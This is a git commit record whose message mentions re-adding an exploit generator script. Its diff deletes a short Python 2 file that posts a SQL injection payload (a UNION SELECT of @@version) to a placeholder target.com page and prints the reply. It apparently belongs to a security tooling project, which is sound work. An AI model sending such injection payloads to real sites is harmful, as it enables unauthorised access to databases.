f872e9cebbe65db024cfd6b2f579e01bd140242d
Chunqi Zhu <chunqi93@gmail.com>
2018-04-24 05:42:04 +0800

    Re-added exploit generator script (incomplete state) * Removed clutter files from root folder * Moved all output into logs/

--- sql_injection['username']9.py
+++
@@ -1,4 +0,0 @@
-import urllib, urllib2, cookielib, requests
-url = "http://target.com/sqli/sqli.php"
-response = requests.post("http://target.com/sqli/sqli.php",{'username': "' union all select 1,@@version,1 -- +"})
-print response.content
